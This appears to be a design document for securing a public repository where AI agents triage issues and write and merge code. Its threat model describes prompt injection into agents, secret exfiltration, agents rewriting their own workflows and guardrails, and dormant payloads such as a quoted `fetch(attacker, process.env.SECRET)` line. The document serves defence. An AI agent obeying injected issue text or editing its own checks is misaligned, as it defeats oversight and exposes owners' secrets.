# security architecture — public autonomous-agent repo

how `opencraft1` stays safe once the repo is **public** and any dev can open an issue that agents
(PM + security + dev) triage, debate, and implement on a daily cadence with little-to-no human in the loop.

> **status.** design of record. not yet implemented. the rollout order is in
> [`security-implementation-plan.md`](security-implementation-plan.md). going public is **blocked on Phase 0**.
>
> **provenance.** this design was adversarially reviewed in a bounded 2-round debate with an independent
> reviewer (Codex/gpt-5.5). the keystone and the capability-based framing came out of that debate; the
> three "max-autonomy" choices (full secrets / fully-autonomous merge / security-agent-as-sole-gate) were
> judged structurally unsafe as literal choices and softened here.

---

## the one thing to get right (keystone)

> **a capability-based merge/deploy policy over the diff, enforced by a mechanism the agent cannot bypass.**

everything else (the classifier, labels, CODEOWNERS, egress allowlists, OIDC, tracing, environments) is
defence-in-depth. if attacker-derived work can produce a merged diff whose **effective capabilities exceed
what deterministic policy allowed**, the rest is theatre.

the load-bearing reframe: **the unit of trust is the merged diff's capabilities, not the issue text.** a
schema-valid PRD, a "small frontend change", or a clean-looking dependency bump can all carry a payload
(`fetch(attacker, process.env.SECRET)`) that lies dormant until it runs in CI / preview / deploy / runtime.
so the gate must reason about what the *diff can do*, not about how nice the request looked.

---

## why public changes everything (threat model)

today's safety rests entirely on the repo being **private**: only collaborators can open issues, so
`authorize.sh` (allowlist OR issue-author) is sound. going public inverts every assumption.

- **T1 — self-authorization.** `authorize.sh` authorizes "author of the originating issue". public = anyone
  is the author of their own issue → can post `/approved` on it → triggers `dev-implement`. the gate
  collapses to "anyone, for their own issue". **primary exploit.**
- **T2 — prompt injection → RCE.** `issues` / `issue_comment` events run with the **base repo's secrets**
  on the **self-hosted runner**, regardless of who wrote the text (unlike fork *PRs*, issue events are not
  fork-gated by GitHub). attacker-controlled issue body becomes the agent prompt (`codex exec` today).
  successful injection = code execution on a persistent machine that holds prod secrets.
- **T3 — secret exfiltration.** with full secrets in every job, one injection exfiltrates Supabase keys,
  deploy creds, the agent session — silently.
- **T4 — guardrail self-modification.** the agent has `contents: write`. an injected task can edit
  `.github/workflows/**`, the agent prompts, `authorize.sh`, the allowlist, or branch protection — i.e.
  rewrite its own cage. note: **scheduled workflows run from the default branch**, so a merged workflow
  change owns all future automation.
- **T5 — malicious-but-plausible feature.** "add a debug endpoint that echoes env", "relax CORS",
  "add this dependency" (typosquat / install-script), "log requests to this URL". looks like a feature; is
  an attack. this is the hardest class — it is **valid code that passes as a feature and runs later where
  secrets or users exist.**
- **T6 — PM discussion sprawl / cost-DoS.** unbounded `issue_comment` triggers = infinite agent↔troll
  loops, brigading, unbounded metered LLM spend.
- **T7 — persistence / backdoored runner.** self-hosted + public is GitHub's canonical "do not do this": a
  compromised non-ephemeral runner is a permanent backdoor into your network. the logged-in **Codex session
  on the runner is itself a high-value credential.**

---

## two planes + deterministic gates

two ideas carry the design.

1. **untrusted plane vs trusted plane.** anything that *reads attacker-controlled text* runs with **no
   secrets, read-only token, ephemeral isolated runner, egress allowlist, no web/file tools**. the trusted
   plane *implements from* a structured spec but **treats that spec as tainted** — it never *obeys* it as
   instructions outside the product-change domain.
2. **what protects `main` must be deterministic, not LLM judgment.** an LLM security agent is itself
   injectable; it is defence-in-depth, never the sole gate. branch protection, path policy, and the
   capability diff-gate are code, and code can't be sweet-talked.

```
issue / comment  (UNTRUSTED text)
      │
      ▼  UNTRUSTED PLANE  · no app/prod secrets · read-only token · ephemeral runner · egress allowlist
      │                   · no web/file tools · Codex session present (gpt-5.4) — isolation (#6) protects it
 ┌──────────────────────────────────────────────────────────────────┐
 │ security-audit agent  → structured verdict {enum, confidence, …}  │
 │ PM agent              → bounded discussion → structured PRD (tainted, carries provenance) │
 └──────────────────────────────────────────────────────────────────┘
      │   only structured JSON crosses — never free-form prose acting as commands
      │   (kills COMMAND injection; SEMANTIC injection still possible → handled by the gate)
      ▼  deterministic dispatcher applies verdict (label / close / lock). agent has no write capability.
 ┌──────────────────────────────────────────────────────────────────┐
 │ DETERMINISTIC GATES (code): injection scan · capability diff-gate │
 │   · path policy · dedupe · rate limit · permission re-check       │
 └──────────────────────────────────────────────────────────────────┘
      │   PRD that passes → spec PR on pm/issue-* branch
      ▼  TRUSTED DEV PLANE · daily cron · Codex session (gpt-5.5) · NO prod secrets · sandboxed · egress-restricted
 ┌──────────────────────────────────────────────────────────────────┐
 │ dev agent implements against the tainted spec → impl PR (codex/issue-*) │
 └──────────────────────────────────────────────────────────────────┘
      │   branch protection + required checks + capability diff-gate (all deterministic, non-bypassable)
      ▼
   merge to main   ──DECOUPLED──▶   DEPLOY PLANE · the ONLY secret-bearing job
                                    · GitHub Environment secrets (scoped to this job) · build w/o prod secrets
                                    · env protection (human gate initially)
```

---

## the 16 agreed controls

grouped by the layer they live in. the implementation order is in the companion plan.

### authorization & secrets
1. **retire issue-author self-authorization.** `OWNER==ACTOR` must no longer grant dev-flow privileges.
   re-check `permission ∈ {admin, write}` via the GitHub API **at execution time** for every privileged
   command (`/approved`, `/merge`, …). **labels are state, not proof of authority** (avoid confused-deputy).
2. **secret segmentation** (free; highest leverage). untrusted plane = 0 secrets; dev plane = 0 prod
   secrets (it only writes code); **deploy = the only secret-bearing job**. converts a successful injection
   from total compromise into a wasted runner minute.

### the gate (keystone)
3. **capability-based diff-gate** — the keystone, a **required, non-bypassable** check. classifies the
   *effective capability change* of the diff and **default-denies ambiguity**. capabilities to detect:
   auth/session/permission changes; data-access & RLS / DB migrations; workflow / CI changes;
   Docker / build / deploy changes; dependency additions (& install scripts); scripts / hooks; new outbound
   network behaviour; logging / tracing sinks; artifact / cache behaviour; generated files; symlink / path
   indirection; GitHub API permission use. path policy alone is **necessary-not-sufficient** — dangerous
   changes hide in "normal" paths (auth logic in app code, RLS in a migration, a Dockerfile tweak).
   implement with `gitleaks` + `semgrep` + a dependency/lockfile diff gate + a path classifier.
4. **risk tiers from the diff, not the issue.**
   - **Tier A (auto-merge):** no new deps, no new outbound hosts, no auth/session/storage/secret access, no
     CI/Docker/build/deploy changes, no privileged routes, no eval/subprocess/dynamic import, bounded diff
     size. **defined by capability, not product area** ("game/content" is not a safe category).
   - **Tier B (human required):** anything else, or capability-gate confidence below threshold.

### planes, runner, billing
5. **Codex subscription everywhere + model tiering** (owner decision, 2026-06: no metered API key). Every
   agent — PM, security, dev — runs on the **Codex subscription session**. Cost is managed by **model tier**,
   not by billing plane: **PM + security → `gpt-5.4`** (cheaper); **dev → `gpt-5.5`**. The consequence: the
   subscription session *is* present in the untrusted PM/security jobs, so it is a high-value credential
   there — its protection rests **entirely on runner isolation (#6)**: ephemeral disposable runner + egress
   allowlist mean a prompt injection can neither persist nor exfiltrate the session. **#6 is therefore the
   sole control standing between an injected PM prompt and the Codex credential — it must be solid.**
6. **runner hardening.** self-hosted stays (subscription billing; public-repo runner minutes are free under
   2026 pricing) but becomes **a disposable VM per job**, not just an `--ephemeral` runner *process*.
   egress allowlist (enumerate the real endpoints — `api.github.com`, `objects.githubusercontent.com`,
   `ghcr.io`, package registries — and treat GitHub itself as an exfil channel: gists/artifacts/comments).
   `actions/checkout` with `persist-credentials: false` on untrusted jobs; **no cache shared between
   untrusted and trusted jobs** (artifacts/caches are a cross-plane injection channel). this is risk
   *reduction*; self-hosted + public remains against GitHub's official guidance — do not treat it as blessed.

### dev plane anti-exfil (even though secretless)
   the dev runner has repo-write authority and the Codex session, so it still needs: no host-level session
   files reachable from the job workspace; no arbitrary outbound network; no broad artifact uploads; tightly
   scoped GitHub token; clean ephemeral workspace. **implement from the spec, never obey it.**

### branch protection (the wall)
7. **branch-protection ruleset on `main`:** no direct pushes; PR required; required status checks (incl. the
   capability gate); linear history; no force-push; signed/bot-identity commits.
8. **CODEOWNERS as the Tier-B enforcement primitive** — only valid with a ruleset that makes it
   **non-bypassable**: required code-owner review on guardrail paths
   (`.github/workflows/**`, `.github/scripts/**`, agent prompts, `authorize.sh`, allowlist, ruleset/env
   config, `*deploy*` / `*secret*` / auth / CORS, dependency manifests/lockfiles); bot can't dismiss reviews
   or bypass protection; admin bypass disabled or audited; automerge/merge-queue can't skip it; the
   ownership files themselves are protected. a bot cannot satisfy a human owner's review → hard block.
9. **least-privilege tokens.** explicit per-job `GITHUB_TOKEN` permissions; **no `checks:` / `statuses:
   write`** in agent jobs (else a compromised job forges a passing required check); pin the expected check
   identity; rulesets must not let bot/admin/Actions bypass required checks.

### deploy
10. **decouple deploy from merge.** merge ≠ deploy. deploy is a separate workflow in the deploy plane (the
    only secret-bearing job). deploy secrets live in a **GitHub Environment** (owner decision, 2026-06: no
    OIDC — Environment secrets are acceptable), exposed **only** to the deploy job that references that
    environment, gated by the environment's protection rules. (OIDC short-lived creds remain a future
    nice-to-have, not required.) environment protection rules can be non-human (wait timer, deployment-
    branch restriction) **but those govern *when/where*, not *whether the diff is safe*** — so zero-human
    deploy is defensible **only if the capability gate (#3) is excellent**. start with a human deploy gate;
    drop it once the gate has earned trust.

### PM sprawl & abuse
11. **bounded conversation** (max rounds → `needs-human`); **structured PRD-complete checklist gate** (no
    checklist → no advance); **dedupe** near-duplicates before expensive work; **per-author + global rate
    limits**; **cost circuit-breaker** (daily metered-spend cap → freeze + alert); gate third-party comments
    on **write-permission** rather than blanket-ignoring (maintainers comment too); the **metered API key is
    a burnable credential** (spend caps, no broad scope, rotate on suspicion).
12. **PRD carries taint + provenance** (quoted source refs). the classifier must not launder attacker text
    into invented authority — structured output stops *command* injection, not *semantic* injection.

### observability & control
13. **tracing with redaction.** Langfuse traces of prompts/outputs may contain secrets/PII/exploit strings —
    redact, access-control, set retention, and **never trace secret-bearing jobs**.
14. **demote the security agent** to triage / UX / abuse-throttling. it is **not** a security boundary
    (it is injectable). the wall is deterministic (#3, #7–#9).
15. **global kill switch** (`agents:freeze` repo variable/label checked first by every workflow) +
    **alerts** (Telegram) on security block, policy-gate failure, Tier-B escalation, merge, deploy, cost
    breach.
16. **new-account friction.** brand-new / zero-reputation accounts get discussion-only + stricter screening;
    trust accrues with merged contributions. doesn't block legit devs (they just talk first); raises the cost
    of throwaway-account abuse.

---

## honest residual risk

with the keystone done well you keep the vision — **any dev, daily cron, hands-off for ordinary features,
Codex subscription billing** — and give up only (a) prod secrets in untrusted jobs and (b) *unconditional*
autonomous merge of capability-escalating diffs.

without the keystone, "fully autonomous to main + full secrets + self-hosted" is **structurally unsafe**.
even with it, the system is **safer, not safe**: the residual risk concentrates in the capability merge gate
and in malicious-but-valid code (T5). the capability taxonomy is a **product-security artifact that needs an
owner** — if it rots, attackers route around it.
